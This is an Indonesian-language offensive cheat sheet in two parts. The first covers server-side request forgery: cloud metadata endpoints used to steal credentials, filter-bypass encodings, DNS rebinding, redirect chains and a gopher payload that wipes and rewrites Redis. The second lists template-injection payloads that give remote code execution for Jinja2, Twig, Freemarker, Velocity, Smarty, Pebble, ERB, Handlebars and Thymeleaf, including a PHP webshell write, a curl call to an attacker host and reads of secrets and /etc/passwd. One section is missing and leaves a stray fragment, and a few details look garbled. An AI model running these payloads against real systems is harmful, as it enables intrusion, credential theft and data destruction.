# SSRF: Endpoint Metadata Cloud & Teknik Bypass Filter

## 1. Matriks Endpoint Metadata Cloud

| Provider | Endpoint | Metode | Header Wajib | Catatan Versi |
|---|---|---|---|---|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` | GET | — | Default pra-2019; masih aktif jika `HttpTokens=optional` |
| AWS IMDSv2 | `http://169.254.169.254/latest/api/token` | **PUT** | `X-aws-ec2-metadata-token-ttl-seconds: 21600` | Token maks 6 jam; butuh PUT (bukan GET/POST) |
| AWS IMDSv2 (pakai token) | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | GET | `X-aws-ec2-metadata-token: <token>` | Wajib header, tidak bisa via redirect |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | GET | `Metadata-Flavor: Google` | Header wajib; `169.254.169.254` juga valid |
| GCP (alias IP) | `http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` | GET | `Metadata-Flavor: Google` | — |
| Azure IMDS | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | GET | `Metadata: true` | Header wajib; tanpa header → 400 |
| Azure (token MSI) | `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` | GET | `Metadata: true` | — |
| Alibaba Cloud | `http://100.100.100.200/latest/meta-data/` | GET | — | IP non-link-local, sering lolos filter `169.254.*` |
| Alibaba (RAM token) | `http://100.100.100.200/latest/meta-data/ram/security-credentials/<role>` | GET | — | — |
| DigitalOcean | `http://169.254.169.254/metadata/v1.json` | GET | — | Format JSON tunggal; DO juga punya `metadata/v1/id`, `.../interfaces/` |
| Oracle Cloud | `http://169.254.169.254/opc/v2/instance/` | GET | `Authorization: Bearer Oracle` | Header wajib |

### Request mentah IMDSv2 (curl)
```http
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
Content-Length: 0

```
Respons: token plaintext 56-byte. Lalu:
```http
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: AQAEAPexample...==

```

### Request mentah GCP
```http
GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
Host: metadata.google.internal
Metadata-Flavor: Google

```

### Request mentah Azure
```http
GET /metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net HTTP/1.1
Host: 169.254.169.254
Metadata: true

```

**Kenapa berhasil/gagal:** IMDSv2 gagal via SSRF GET-only karena mekanisme PUT+header tidak bisa dipalsukan lewat redirect atau banyak sink HTTP. GCP/Azure gagal jika aplikasi target membuang header kustom (`Metadata-Flavor`, `Metadata: true`) — umum di library HTTP yang meng-whitelist header.

---

## 2. Bypass Filter IP

| Teknik | Payload | Resolusi | Lolos filter jika… |
|---|---|---|---|
| Desimal | `http://2852039166/` | 169.254.169.254 | filter regex string `169.254` |
| Oktal | `http://0251.0376.0251.0376/` | 169.254.169.254 | filter regex dotted-decimal |
| Hex | `http://0xa9.0xfe.0xa9.0xfe/` | 169.254.169.254 | filter regex angka |
| Hex penuh | `http://0xA9FEA9FE/` | 169.254.169.254 | parser inet_aton |
| Campuran | `http://169.254.43518/` | 169.254.169.254 | parser 32-bit |
| IPv6-mapped | `http://[::ffff:169.254.169.254]/` | 169.254.169.254 | filter hanya IPv4 |
| IPv6-mapped hex | `http://[::ffff:a9fe:a9fe]/` | 169.254.169.254 | idem |
| IPv6 link-local | `http://[fe80::a9fe:a9fe]/` | — | jarang, butuh scope |
| Provider alt | `http://100.100.100.200/` (Alibaba) | — | filter hanya `169.254.*` |
| DoH resolve | `http://169.254.169.254.nip.io/` | 169.254.169.254 | filter tidak resolve DNS |

**Kenapa berhasil:** `inet_aton`/`inet_pton` di glibc dan Go `net.ParseIP` mengartikan semua bentuk di atas sebagai alamat yang sama. Filter yang pure regex-string tidak menormalkan.

**Kenapa gagal:** filter modern (mis. Go `net.IP.IsLinkLocalUnicast()`, Python `ipaddress.ip_address().is_link_local`) menormalkan dulu → semua bentuk desimal/oktal/hex/mapped tertangkap.

---

## 3. DNS Rebinding

**Mekanisme:** nama domain (mis. `rebind.attacker.tld`) di-resolve dua kali oleh target: pertama ke IP eksternal (lolos validasi), kedua ke `169.254.169.254` (saat fetch sesungguhnya). Bergantung TTL rendah dan race window.

```http
GET /fetch?url=http://rebind.attacker.tld/latest/meta-data/ HTTP/1.1
Host: victim-app.com

```
Attacker DNS server mengembalikan `1.2.3.4` TTL=0 saat validasi, lalu `169.254.169.254` TTL=0 saat connect.

**Berhasil jika:** aplikasi memvalidasi via DNS resolve terpisah dari koneksi TCP (TOCTOU). **Gagal jika:** runtime memakai `DialContext` yang melakukan pinning ke IP ter-resolve awal, atau resolver meng-cache TTL=0, atau ada pinochle di Go 1.19+ (`net.Dialer.Resolver` + literal IP) — banyak framework modern (mis. `http.Client` dengan `DialContext` kustom yang re-resolve) tahan.

Untuk IMDSv2 rebinding tetap gagal — butuh PUT + header.

---

## 4. Open-Redirect Chain

Jika ada endpoint di domain target yang redirect ke parameter:
```http
GET /redirect?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: victim.com

```
Lewat SSRF:
```http
GET /fetch?url=https://victim.com/redirect%3Furl%3Dhttp://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: app.internal

```
Filter SSRF melihat host = `victim.com` (whitelisted), fetch mengikuti 302 ke metadata.

**Gagal jika:** HTTP client target `CheckRedirect` memblokir, atau tidak mengikuti redirect (`maxRedirects=0`), atau redirect mengubah method PUT→GET (IMDSv2 hilang).

---

## 5. URL Parser Confusion

| Payload | Perilaku parser | Target aktual |
|---|---|---|
| `http://expected.com@169.254.169.254/` | userinfo diabaikan validator naive | 169.254.169.254 |
| `http://169.254.169.254#@expected.com/` | fragment stripping | 169.254.169.254 |
| `http://169.254.169.254%00.expected.com/` | null byte di host | tergantung parser |
| `http://expected.com.169.254.169.254.nip.io/` | subdomain trick | 169.254.169.254 |
| `http://169.254.169.254:80\\@expected.com/` | backslash di Node URL vs Python urllib | beda-host |
| `http://[::ffff:169.254.169.254]@expected.com/` | bracket parsing | — |
| `gopher://127.0.0.1:6379/_INFO` | scheme confusion | Redis |

**Kenapa berhasil:** regex whitelist `^https?://expected\.com` atau `endsWith('.expected.com')` tidak cocok dengan parser `urlparse` yang sebenarnya. Perbedaan konkret: Node 20 `new URL()` menolak backslash sebagai separator di authority, Python 3.11 `urlsplit` menerima `@` di path, Go `url.Parse` memisahkan `Host` vs `Hostname()`.

---

## 6. 302 ke gopher:// (Redis Pivot)

Server target dengan redirect terbuka dan HTTP client yang mengikuti skema:
```http
GET /fetch?url=http://attacker.tld/r HTTP/1.1
Host: victim.com

```
Attacker `r` membalas:
```http
HTTP/1.1 302 Found
Location: gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2424%0D%0A%0D%0A%0A%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%245%0D%0Axx%0D%0A%2440%0D%0A%0A%0A%0A%0A%2A1%0D%0A%241%0D%0Asave%0D%0A

```
**Berhasil jika:** library target mendukung gopher (curl 7.x, Python `requests` via `urllib3` **tidak**, butuh custom handler; **aiohttp** tidak default). **Gagal jika:** Go `net/http`, Node `undici`, Java 11 `HttpClient` — semua menolak skema non-HTTP di redirect.

Redis 7.x default menolak `CONFIG SET dir` dari luar `protected-mode`, tapi `SLAVEOF`/`REPLICAOF` + `MODULE LOAD` masih jalan.

---

## 7. Pivot Internal: Redis / Memcached / Elasticsearch / HTTP

### Redis (unauthenticated 6379)
```http
GET /fetch?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Ainfo%0D%0A HTTP/1.1
```
Atau via HTTP-style command (Redis ≥2.6 menerima inline): `http://127.0.0.1:6379/%0D%0AINFO%0D%0A`

### Memcached (11211)
```http
GET /fetch?url=http://127.0.0.1:11211/stats HTTP/1.1
```
Memcached tidak punya skema lain — cukup pakai HTTP GET untuk `stats`, `get <key>`, `set`. Bypass gopher dengan `dict://127.0.0.1:11211/stats` bila client dukung.

### Elasticsearch (9200)
```http
GET /fetch?url=http://127.0.0.1:9200/_cat/indices?v HTTP/1.1
GET /fetch?url=http://127.0.0.1:9200/_search?q=password HTTP/1.1
```
Jika ES 7.10+ dengan X-Pack aktif, butuh auth — cek `http://127.0.0.1:9200/_security/_authenticate`.

### Internal HTTP admin
```http
GET /fetch?url=http://127.0.0.1:8500/v1/agent/self HTTP/1.1   # Consul
GET /fetch?url=http://127.0.0.1:2375/containers/json HTTP/1.1  # Docker API
GET /fetch?url=http://127.0.0.1:9090/api/v1/targets HTTP/1.1   # Prometheus
GET /fetch?url=http://127.0.0.1:15672/api/overview HTTP/1.1    # RabbitMQ mgmt
GET /fetch?url=http://127.0.0.1:8080/actuator/env HTTP/1.1     # Spring Boot
GET /fetch?url=http://127.0.0.1:9200/_nodes HTTP/1.1           # ES
```

**Kenapa berhasil:** Redis/Memcached/ES tidak memvalidasi `Host` header → bekerja dengan Host acak. Spring Actuator `/actuator/env` sejak 2.6 butuh `management.endpoints.web.exposure.include`, sering lupa di-set.

---

## 8. Blind SSRF

### Timing-based
```http
GET /fetch?url=http://10.0.0.1:22/ HTTP/1.1
```
- Port terbuka (SSH banner) → respons < 100 ms, koneksi reset.
- Port tertutup → SYN timeout ~3–10 s (triple retransmit kernel Linux 5.x).

Selisih rata-rata 2–8 detik adalah sinyal. Bandingkan 20 sampel per port.

### Collaborator / DNS callback
```
Payload: http://<uniq>.oast.pro/latest/meta-data/
```
Bila ada DNS query di log collaborator → URI fetcher aktif (bukan honya filter). Bila ada HTTP hit → outbound egress terbuka, kandidat rebinding/gopher tidak perlu egress langsung.

### Error-based blind
Bandingkan respons 200 vs 500 antar payload: `http://127.0.0.1:1/` (closed → exception) vs `http://169.254.169.254/` (filter blok → 403 aplikasi). Perbedaan kelas status mengungkap keberadaan filter.

---

```http
Host: victim.com

```

---

## 10. Jebakan Operasional (Real-World Failure Modes)

1. **IMDSv2 default sejak AWS 2024** — akun baru default `HttpTokens=required`. SSRF GET-only otomatis gagal; jangan buang waktu kecuali target bisa PUT.
2. **Go `net/http` & Node `undici` (18+)** menolak skema non-HTTP/gopher di redirect → vektor 302→gopher mati di target modern. Uji tumpukan target dulu (header `Server`, `Via`, framework fingerprint).
3. **Header stripping** — banyak aplikasi/proxy (nginx 1.25 `proxy_pass`, Envoy 1.29, Cloudflare) membuang header kustom. GCP/Azure butuh header → blind spot. Cek dengan kolaborator apakah `Metadata-Flavor` benar-benar terkirim.
4. **Egress firewall egress-only allowlist** — banyak VPC kini memblokir `169.254.169.254` via NetworkPolicy (Calico 3.27, Cilium 1.15) kecuali dari node pool tertentu. Callback kolaborator hilang = egress tertutup total.
5. **IMDS hop limit** — AWS `HttpPutResponseHopLimit` default 1 (container butuh 2). Pod Kubernetes dengan hop=1 gagal ambil token bahkan jika PUT lolos.
6. **Resolver caching TTL=0** di sistemd-resolved 255 / CoreDNS 1.11 → DNS rebinding tidak berubah IP dalam window. Naikkan rate race atau pakai `A` record dengan `CNAME` chain.
7. **WAF regex normalisasi** — Cloudflare/AWS WAFv2 (2023+) sudah menormalkan desimal/oktal/hex → payload `0xa9fea9fe` di-rewrite jadi `169.254.169.254` sebelum sampai app. Jangan anggap WAF = no filter.
8. **Null byte URL** — Python `urllib` 3.x sudah menolak `%00` di host (`ValueError`), Chrome 131 di URL bar juga. Payload null-byte sering mati di parser modern.
9. **Redis protected-mode** (default ON sejak 3.2) menolak command dari non-loopback non-auth **hanya untuk TCP langsung**; via SSRF dari `127.0.0.1` tetap jalan — ini justru yang kita mau, tapi `CONFIG` dibatasi Redis 7.x, gunakan `REPLICAOF`/`MODULE LOAD`.
10. **Memcached UDP 11211** — jangan salah probe, SSRF HTTP ke UDP tidak terjadi; hanya TCP.
11. **Elasticsearch 8.x default TLS + auth** — `_cat/indices` mengembalikan 401 tanpa kredensial. Blind SSRF hanya memberi sinyal port terbuka, bukan data.
12. **Azure IMDS header case-sensitivity** — `Metadata: true` harus persis; `metadata:` di beberapa versi IMDS (2020) ditolak.
13. **Kubernetes 1.29+ `ServiceAccount` bound tokens** — token proyeksi berumur 1 jam, dan banyak pod tidak punya akses ke cloud metadata karena `automountServiceAccountToken=false` dan IMDS hop limit.
14. **302 chain limit** — Go default 10 redirect, curl 50; chain panjang untuk evade filter sering menabrak limit di hop ke-11. Hitung ulang.
15. **gopher URL encoding** — karakter `%0D%0A` harus dobel-encode (`%250D%250A`) jika aplikasi melakukan URL-decode sekali sebelum fetch; salah encode → Redis menerima command rusak dan menutup koneksi tanpa error yang jelas.
16. **DNS rebinding + IMDSv2** — kombinasi tidak membantu; PUT tidak bisa dipalsukan via DNS. Realistis hanya untuk IMDSv1/GCP/Azure/DO/Alibaba.
17. **Loopback block di kernel** — container dengan `net.ipv4.conf.all.route_localnet=0` dan CNI tertentu (Calico default) memblokir `127.0.0.1` → pivot internal ke localhost gagal; pakai `169.254.169.254` atau IP pod lain.


## ssti

# ssti — web

# SSTI: Referensi Engine, Probe, dan RCE

## 1. Peta Engine & Sintaks Dasar

| Engine | Bahasa | Deteksi Sintaks | Ekspresi Uji | Output Normal |
|---|---|---|---|---|
| Jinja2 | Python | `{{7*7}}` | `{{7*7}}` | `49` |
| Twig | PHP | `{{7*7}}` | `{{7*7}}` | `49` |
| Freemarker | Java | `${7*7}` | `${7*7}` | `49` |
| Velocity | Java | `#set($x=7)` | `#set($x=7*7)$x` | `49` |
| Smarty | PHP | `{7*7}` atau `{$x}` | `{7*7}` / `{math equation="7*7"}` | `49` |
| Pebble | Java | `{{7*7}}` | `{{7*7}}` | `49` |
| ERB | Ruby | `<%= 7*7 %>` | `<%= 7*7 %>` | `49` |
| Handlebars | JS | `{{7*7}}` | `{{7*7}}` — **TIDAK evaluasi**, literal | `{{7*7}}` (gagal) |
| Thymeleaf | Java | `__${...}__` | `__${7*7}__::x` | `49` (butuh preprocessor) |

Aturan cepat:
- `{{7*7}}` = `49` → Jinja2, Twig, Pebble, Nunjucks ambigu; disambiguasi lanjut.
- `{{7*7}}` = literal `{{7*7}}` → Handlebars / Mustache (tidak evaluasi aritmetika).
- `${7*7}` = `49` → Freemarker, JSP EL, Velocity (via `#set`).
- `<%= %>` = `49` → ERB.
- `{7*7}` = `49` → Smarty (default `{` `}`).

## 2. Polyglot Probe

Kirim satu string, cek respons. Urutan prioritas:

```
${{7*7}}{7*7}{{7*7}}<%=7*7%>#{7*7}*{7*7}
```

Payload polyglot multi-engine (kirim ke parameter/header/body yang dirender):

```
{{7*7}}${7*7}#{7*7}<%=7*7%>[%7*7%]{7*7}
```

Hasil pembacaan:
- Muncul `49` satu kali dari `{{7*7}}` saja → Jinja2/Twig/Pebble.
- Muncul `49` dari `${7*7}` → Freemarker/JSP.
- Muncul `49` dari `<%= %>` → ERB.
- Muncul `49` dari `{7*7}` → Smarty.
- Muncul `49` dari `#{7*7}` → Ruby string interpolation (`#{}`) — bukan engine, tapi indikasi Ruby.
- Semua literal → tidak ada evaluasi, kandidat Handlebars/Mustache atau input tidak dirender (XSS reflected biasa).

Probe diferensiasi Jinja2 vs Twig vs Pebble (semua `{{7*7}}=49`):

```
{{7*'7'}}
```
- Jinja2 → `7777777`
- Twig → `49` (string cast, `'7'*7` = 49 aritmetik di Twig)
- Pebble → error / `49`

```
{{'7'*'7'}}
```
- Jinja2 → error (`'7'*'7'` tidak valid)
- Twig → `49`

Probe diferensiasi Jinja2 vs Nunjucks:
```
{{range(0,3)}}       → Jinja2: <range 0..3> ; Nunjucks: error
{{cycler}}           → Jinja2: <class 'jinja2.utils.Cycler'> ; Nunjucks: literal
```

Probe Freemarker vs Velocity:
```
${7*7}      → Freemarker: 49 ; Velocity: literal ${7*7}
#set($x=7*7)$x  → Velocity: 49 ; Freemarker: literal
```

Probe Thymeleaf (sering di Spring):
```
__${T(java.lang.Runtime).getRuntime()}__::x
```
Jika error mengandung `org.thymeleaf` → Thymeleaf aktif.

Perintah shell untuk prober otomatis (ffuf + wordlist polyglot):

```bash
# wordlist payload.txt berisi polyglot di atas
ffuf -u 'https://target/search?q=FUZZ' -w payload.txt -mr '49' -ac
```

```bash
# probe dengan header (sering dirender di error page / email template)
curl -s -H 'X-Template: {{7*7}}' https://target/ | grep -o '49' | head
```

## 3. Payload RCE per Engine

### 3.1 Jinja2 (Python — Flask, Django tidak pakai Jinja2)

Deteksi versi:
```
{{config}}                       → <Config {...}>
{{config.items()}}               → daftar item config
{{self.__class__.__mro__}}       → mro chain
```

RCE klasik:
```
{{''.__class__.__mro__[1].__subclasses__()}}
```
Cari index `subprocess.Popen`:
```
{{''.__class__.__mro__[1].__subclasses__()[<idx>]('id',shell=True,stdout=-1).communicate()}}
```

Stabil tanpa index (Jinja2 ≥2.11, Python 3):
```
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__.os.popen('id').read()}}
```

Bypass blacklist `__`, `os`, `popen`, `class`, `mro`, `subclasses`, `[]`, `.`:
```
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()}}
```
Atau gunakan `request` global (Flask):
```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Bypass `{{ }}` diblok — gunakan `{% %}`:
```
{%print(cycler.__init__.__globals__.os.popen('id').read())%}
```

Jinja2 SandboxedEnvironment bypass (Flask-Babel, beberapa app):
- `SandboxedEnvironment` memblok `__` dan akses atribut internal.
- Bypass umum (CVE-2019-10906, Jinja2 <2.10.1):
```
{{''.__class__.__mro__[1].__subclasses__()[<Popen idx>]}}
```
- Bypass via `format` (Jinja2 <3.0.3, CVE-2024-22195 tidak langsung RCE):
```
{{'{0.__class__}'.format('')}}
```
- Bypass baru Jinja2 3.1.x: tidak ada RCE langsung; cari sink lain (file upload, SSRF).

`__init__.__globals__` jalan karena atribut dunder tidak diblokir di default `Environment`. `SandboxedEnvironment` memblok akses ke atribut yang diawali `_`.

Environment read:
```
{{config}}
{{config.SECRET_KEY}}
{{request.environ}}
{{get_flashed_messages.__globals__.__builtins__.__import__('os').environ}}
```

### 3.2 Twig (PHP — Symfony, Drupal, Bolt)

Deteksi versi:
```
{{_self.env.getLoader()}}        → Twig\Loader\...
{{_self.env.getGlobals()}}
```

Twig 1.x (banyak sink lama):
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

Twig 2.x/3.x (Symfony — `filter` tidak expose `env`):
```
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
```

Twig 3.x RCE stabil (Symfony, via `map`+`call`):
```
{{['id']|filter('system')}}
```
(butuh `system` di daftar function yang tidak diblok; default Twig membolehkan PHP functions).

Twig SSTI untuk Drupal 7/8 (Twig 1.38+):
```
{{_self.env.registerUndefinedFilterCallback("passthru")}}{{_self.env.getFilter("id")}}
```

Twig `SandboxExtension` aktif:
- `system`, `exec`, `passthru` diblok.
- Bypass via `{{['id']|filter('system')}}` jika `filter` tidak diblok; jika `filter` diblok, cari `sort`, `map`, `reduce` dengan callback.
- Twig 3.x dengan `sandbox` + `restrict`: hanya fungsi di `allowed_functions` — RCE sulit, alihkan ke file read/Twig `source()`:
```
{{source('/etc/passwd')}}
```

Bypass filter `{{ }}`:
```
{% set x = ['id']|filter('system') %}
{% dump x %}
```

Freemarker, Velocity, Smarty, Pebble, ERB, Handlebars, Thymeleaf — lihat di bawah.

### 3.3 Freemarker (Java — Spring, OFBiz, Liferay)

Deteksi:
```
${7*7}                           → 49
${.version}                      → 2.3.x
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

RCE stabil (Freemarker <2.3.30, dan banyak >2.3.30 dengan `TemplateClassResolver` default):
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

Bypass blokir `Execute` (Freemarker ≥2.3.30 — `TemplateClassResolver.UNRESTRICTED` tidak aktif, tapi `ObjectConstructor` masih bisa):
```
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","id").start()}
```
```
<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("id")</@value>
```

Bypass via `api` builtin (parsing `?api` — butuh `APIBuiltin` di `Freemarker` 2.3.x dengan `api_builtin_enabled=true`):
```
<#assign classloader=Object?api.class.getClassLoader()>${classloader.loadClass("freemarker.template.utility.Execute")?new()("id")}
```

Bypass blacklist string `Execute`/`java.lang` — pakai `${...?new()}` dengan string concat:
```
<#assign x="Exec"+"ute">
<#assign ex="freemarker.template.utility.${x}"?new()>${ex("id")}
```

File read (tanpa RCE):
```
${.data_model}
<#assign x = "freemarker.template.utility.ObjectConstructor"?new()>
${x("java.io.FileReader","/etc/passwd")}
```

Catatan: `spring.view`/`WebApplicationContext` sering tersedia — akses env:
```
${springMacroRequestContext.getBean("environment").getProperty("spring.datasource.password")}
```

### 3.4 Velocity (Java — Spring Velocity, Atlassian)

Deteksi:
```
#set($x=7*7)$x                    → 49
$class.inspect("java.lang.Runtime")  → jika `$class` tersedia
```

RCE (classic, Velocity 1.x/2.x dengan `Runtime` di context):
```
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

Variasi pendek (Velocity 2.x, `$class` tools):
```
#set($e="e")$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
```
(umumnya gagal tanpa `$e` runtime — butuh `Runtime` di context; gunakan versi panjang).

Bypass blokir `Runtime`:
```
#set($s="")#set($r=$s.class.forName("java.lang.Run"+"time"))...
```

File read:
```
#set($f=$s.class.forName("java.io.FileReader"))#set($r=$f.getConstructor($s.class.forName("java.lang.String")).newInstance("/etc/passwd"))#set($br=$s.class.forName("java.io.BufferedReader").getConstructor($s.class.forName("java.io.Reader")).newInstance($r))...
```

Velocity tool-class (`ToolManager`) sering expose `$date`, `$math`, `$list` — bukan RCE langsung.

### 3.5 Smarty (PHP — PrestaShop, OsCommerce)

Deteksi:
```
{7*7}                            → 49
{$smarty.version}                → 3.x
```

RCE Smarty 2.x:
```
{php}echo `id`;{/php}
```
(Blok `{php}` dihapus di Smarty 3.)

Smarty 3.x RCE (via `{system()}` jika `SmartyBC` aktif):
```
{system('id')}
{/system}
```

RCE stabil Smarty 3.x:
```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```
Lalu `?cmd=id`.

Bypass `{` `}` filter → gunakan `{literal}`:
```
{literal}{system('id')}{/literal}
```
(jika filter hanya regex `{...}` di luar literal).

File read:
```
{include file="/etc/passwd"}
```

Env:
```
{$smarty.const.PHP_VERSION}
{$smarty.server.REMOTE_ADDR}
{$smarty.env.PATH}
```

### 3.6 Pebble (Java — Spring Pebble, SpringBoot)

Deteksi:
```
{{7*7}}                          → 49
{{'a'|upper}}                    → A
```

RCE Pebble 2.x (<3.1.2 — CVE-2024-XXXX tidak ada; Pebble umumnya aman dari RCE via sandbox):
Pebble 2.x tidak punya sink RCE bawaan. Namun bila `PebbleTemplate` dibuat dengan `addExtension(new SpringExtension())`, ada jalur SSRF/file read via `{{ beans }}`:
```
{{ beans['dataSource'].connection.metaData.getURL() }}
```

Pebble 3.x dengan `SpringExtension` di Spring Boot:
```
{{ beans['environment'].getProperty('spring.datasource.password') }}
```

Bypass via `getClass` (Pebble 3.x tidak memblok `getClass`):
```
{{ beans['x'].getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
```
Jika `getClass` diblok, coba `{{ beans['x'].class }}` (tidak valid Pebble) — umumnya Pebble sandbox aman; alihkan ke `{{ beans[...] }}` untuk exposure.

### 3.7 ERB (Ruby — Rails view, Sinatra, Puppet)

Deteksi:
```
<%= 7*7 %>                       → 49
<%= RUBY_VERSION %>              → 3.x.x
```

RCE:
```
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.read('/etc/passwd') %>
```

Bypass filter `<%= %>` (jika dihapus) — gunakan `<% %>`:
```
<% system('id') %>
```

Rails ERB dengan `sanitize` — ERB tidak disandbox by default; jika `<%= %>` diblok, coba `<%=` dengan spasi/`<%=` newline:
```
<%=
system('id')
%>
```

Env:
```
<%= ENV['PATH'] %>
<%= Rails.application.config %>
```

ERB di Puppet (server) — payload masuk ke template Puppet, eksekusi sebagai user `puppet` (root sering):
```
<%= scope.lookupvar('::fqdn') %>
<%= `id` %>
```

### 3.8 Handlebars (JS — Node.js, Express view engine)

Handlebars **tidak mengevaluasi JS**. `{{7*7}}` = literal. RCE hanya jika:
1. `Handlebars.compile` dengan `allowProtoMethodsByDefault` / `allowProtoPropertiesByDefault` dimatikan, atau
2. App memakai `handlebars` + `express-handlebars` dengan helper kustom yang tidak aman.

Cek versi Handlebars:
```
{{#each (lookup . 'constructor')}}{{/each}}   → error vs jalan
```

Handlebars <4.0.0 (CVE-2019-19919, prototype pollution):
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id')"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
(Versi <4.0.0; output `id`.)

Handlebars 4.x aman dari SSTI murni. Jika app pakai `express-handlebars` + helper `custom` yang memanggil `eval`, eksploitasi lewat helper tersebut, bukan engine.

Handlebars dengan `handlebars.compile` + `helpers: {log: ...}` — tidak RCE.

**Kesimpulan:** jika `{{7*7}}` literal, hentikan SSTI, alihkan ke XSS/path traversal. Jangan buang waktu payload RCE Handlebars di versi 4.x.

### 3.9 Thymeleaf (Java — Spring Boot)

Deteksi:
```
__${7*7}__::x                    → 49 (butuh preprocessor)
${7*7}                           → 49 (Spring EL, bukan Thymeleaf murni)
```

Thymeleaf 3.x RCE (Spring Boot 1.x/2.x, `spring-boot-starter-thymeleaf`):
```
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```
Untuk blind (tanpa output — `exec` return `Process`, tidak dieksekusi `.waitFor()`):
```
__${T(java.lang.Runtime).getRuntime().exec('curl http://attacker/x')}__::.x
```
Atau SpEL `ProcessBuilder`:
```
__${new java.lang.ProcessBuilder('id').start()}__::.x
```

Baca output RCE (SpEL, Spring Boot, `T()` tersedia):
```
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('id')}
```
(`exec` mengembalikan `Process` — untuk output, gunakan `ProcessBuilder` + `InputStream`:
```
__${new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()))}__::.x
```

Bypass filter `T(`, `Runtime`, `__${`:
- SpEL di Thymeleaf memblok `T(` jika `spring.expression` — coba `${...}` biasa (Spring EL tanpa Thymeleaf preprocessor) jika app meneruskan input ke `expressionParser`.
- Bypass via `Session`/`RequestContext`:
```
${#request.getSession().getServletContext()}
```

File read:
```
__${T(org.apache.commons.io.FileUtils).readFileToString(T(java.io.File)('/etc/passwd'))}__::.x
```

Env (Spring):
```
${@environment.getProperty('spring.datasource.password')}
```
(SpEL bean reference `@environment` — jalan bila `StandardEvaluationContext` dengan bean resolver.)

Thymeleaf 3.0.12+ / Spring Boot 2.4+ membatasi `T(` dan `@`; jika error `Instantiation of new objects and access to static classes is forbidden`, cari sink alternatif (path traversal `spring.view.prefix`, SSRF via `@environment`).

## 4. Akses Config/Env per Engine

| Engine | Payload | Output |
|---|---|---|
| Jinja2 | `{{config}}` | `<Config {'DEBUG': False, ...}>` |
| Jinja2 | `{{config['SECRET_KEY']}}` | `dev-secret` |
| Jinja2 | `{{request.environ['AWS_SECRET_ACCESS_KEY']}}` | value |
| Twig | `{{app.request.server.get('AWS_SECRET_ACCESS_KEY')}}` (Symfony) | value |
| Twig | `{{dump(_context)}}` (jika `dump` ext) | seluruh context |
| Freemarker | `${.data_model}` | map seluruh data model |
| Freemarker | `${springMacroRequestContext.getBean("environment").getProperty("DB_PASSWORD")}` | value |
| Velocity | `$context` / `$springMacroRequestContext` | bean context |
| Smarty | `{$smarty.env.AWS_SECRET_ACCESS_KEY}` | value |
| Smarty | `{$smarty.server.HTTP_HOST}` | value |
| Pebble | `{{ beans['environment'].getProperty('DB_PASSWORD') }}` | value |
| ERB | `<%= ENV['AWS_SECRET_ACCESS_KEY'] %>` | value |
| ERB | `<%= Rails.application.credentials.secret_key_base %>` | value |
| Thymeleaf | `${@environment.getProperty('DB_PASSWORD')}` | value |
| Thymeleaf | `${T(java.lang.System).getenv()}` | map env |

## 5. File Read per Engine

| Engine | Payload | Catatan |
|---|---|---|
| Jinja2 | `{{lipsum.__globals__.__builtins__.open('/etc/passwd').read()}}` | Py3, `open` di builtins |
| Jinja2 | `{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}` | fallback |
| Twig | `{{source('/etc/passwd')}}` | butuh `source` function tidak dimatikan |
| Twig | `{{include('/etc/passwd')}}` | jika `include` tidak diblok |
| Freemarker | `<#assign x="freemarker.template.utility.ObjectConstructor"?new()>${x("java.io.FileReader","/etc/passwd")}` | + baca via `BufferedReader` |
